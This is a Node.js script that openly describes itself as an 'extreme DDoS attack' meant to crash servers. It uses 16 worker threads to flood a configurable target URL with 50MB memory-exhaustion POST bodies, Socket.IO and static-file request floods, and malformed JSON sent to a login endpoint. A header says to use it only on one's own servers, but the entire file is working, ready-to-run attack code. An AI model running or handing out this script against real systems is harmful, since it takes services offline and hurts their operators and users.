#!/usr/bin/env node

/**
 * EXTREME DDoS Attack Script - Designed to Crash Ubuntu Servers
 * WARNING: Only use against YOUR OWN servers for testing!
 * This creates massive memory pressure and high-volume attacks
 */

import http from 'http'
import https from 'https'
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads'
import { URL } from 'url'

const TARGET_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000'
const WORKERS = 16 // More workers
const REQUESTS_PER_WORKER = 100 // Requests per worker per second
const DURATION = 120 // 2 minutes

if (isMainThread) {
    // Main thread - coordinate the attack
    console.log('💥💥💥 EXTREME DDoS ATTACK - MEMORY EXHAUSTION MODE 💥💥💥')
    console.log('═══════════════════════════════════════════════════════════')
    console.log(`🎯 Target: ${TARGET_URL}`)
    console.log(`👥 Workers: ${WORKERS}`)
    console.log(`⚡ Rate: ${WORKERS * REQUESTS_PER_WORKER} requests/second`)
    console.log(`⏱️  Duration: ${DURATION} seconds`)
    console.log(`💾 Strategy: MASSIVE MEMORY EXHAUSTION + HIGH VOLUME`)
    console.log('═══════════════════════════════════════════════════════════\n')

    const workers = []
    const stats = {
        total: 0,
        success: 0,
        failed: 0,
        errors: 0
    }

    // Create worker pool
    for (let i = 0; i < WORKERS; i++) {
        const worker = new Worker(new URL(import.meta.url), {
            workerData: { 
                id: i, 
                target: TARGET_URL,
                requestsPerSecond: REQUESTS_PER_WORKER,
                duration: DURATION
            }
        })

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.total += msg.total
                stats.success += msg.success
                stats.failed += msg.failed
                stats.errors += msg.errors
            }
        })

        worker.on('error', (err) => {
            console.error(`❌ Worker ${i} error:`, err.message)
        })

        workers.push(worker)
    }

    // Display real-time stats
    const statsInterval = setInterval(() => {
        const rps = Math.round(stats.total / ((Date.now() - startTime) / 1000))
        console.log(`📊 Total: ${stats.total} | Success: ${stats.success} | Failed: ${stats.failed} | Errors: ${stats.errors} | RPS: ${rps}`)
    }, 2000)

    const startTime = Date.now()

    // Stop attack after duration
    setTimeout(() => {
        clearInterval(statsInterval)
        workers.forEach(w => w.terminate())
        
        const totalTime = (Date.now() - startTime) / 1000
        console.log('\n═══════════════════════════════════════════════════════════')
        console.log('💥 ATTACK COMPLETED')
        console.log(`⏱️  Duration: ${totalTime.toFixed(2)}s`)
        console.log(`📊 Total Requests: ${stats.total}`)
        console.log(`✅ Successful: ${stats.success}`)
        console.log(`❌ Failed: ${stats.failed}`)
        console.log(`⚠️  Errors: ${stats.errors}`)
        console.log(`⚡ Average RPS: ${Math.round(stats.total / totalTime)}`)
        console.log('═══════════════════════════════════════════════════════════')
        
        process.exit(0)
    }, DURATION * 1000)

} else {
    // Worker thread - execute attack
    const { id, target, requestsPerSecond, duration } = workerData
    const targetUrl = new URL(target)
    
    let workerStats = {
        total: 0,
        success: 0,
        failed: 0,
        errors: 0
    }

    // Attack patterns that consume server memory
    const attackPatterns = [
        // 1. Large payload POST requests
        () => sendLargePayload(targetUrl),
        // 2. Rapid GET requests
        () => sendGetRequest(targetUrl, '/'),
        // 3. Socket.IO connection spam
        () => sendGetRequest(targetUrl, '/socket.io/'),
        // 4. Static resource flooding
        () => sendGetRequest(targetUrl, '/stockfish/stockfish.wasm'),
        // 5. JSON payload attacks
        () => sendJsonPayload(targetUrl),
    ]

    function sendLargePayload(url) {
        return new Promise((resolve) => {
            // Create MASSIVE payload to consume server memory - 50MB!
            const payload = JSON.stringify({
                attack: 'memory-exhaustion',
                data: 'X'.repeat(1024 * 1024 * 50), // 50MB per request (was 100KB)
                timestamp: Date.now(),
                random: Math.random().toString(36).repeat(100)
            })

            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: '/',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload),
                    'User-Agent': `DDoS-Worker-${id}-${Math.random()}`
                },
                timeout: 2000
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    workerStats.success++
                    resolve()
                })
            })

            req.on('error', () => {
                workerStats.errors++
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.write(payload)
            req.end()
            workerStats.total++
        })
    }

    function sendGetRequest(url, path) {
        return new Promise((resolve) => {
            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: path,
                method: 'GET',
                headers: {
                    'User-Agent': `DDoS-Worker-${id}-${Date.now()}`,
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                timeout: 1500
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    workerStats.success++
                    resolve()
                })
            })

            req.on('error', () => {
                workerStats.errors++
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.end()
            workerStats.total++
        })
    }

    function sendJsonPayload(url) {
        return new Promise((resolve) => {
            const malformedJson = '#'.repeat(5000) + 'ATTACK' + Date.now()
            
            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: '/api/user/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(malformedJson),
                    'User-Agent': `Attack-${id}`
                },
                timeout: 1500
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    workerStats.success++
                    resolve()
                })
            })

            req.on('error', () => {
                workerStats.errors++
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.write(malformedJson)
            req.end()
            workerStats.total++
        })
    }

    // Attack loop
    const interval = 1000 / requestsPerSecond
    let requestCount = 0
    const maxRequests = requestsPerSecond * duration

    const attackLoop = setInterval(async () => {
        if (requestCount >= maxRequests) {
            clearInterval(attackLoop)
            parentPort.postMessage({ type: 'stats', ...workerStats })
            return
        }

        // Use random attack pattern
        const pattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)]
        pattern().catch(() => {})
        
        requestCount++

        // Send stats every 5 seconds
        if (requestCount % (requestsPerSecond * 5) === 0) {
            parentPort.postMessage({ type: 'stats', ...workerStats })
        }
    }, interval)

    // Also send bursts for extra pressure
    setInterval(() => {
        for (let i = 0; i < 20; i++) {
            const pattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)]
            pattern().catch(() => {})
        }
    }, 5000)
}
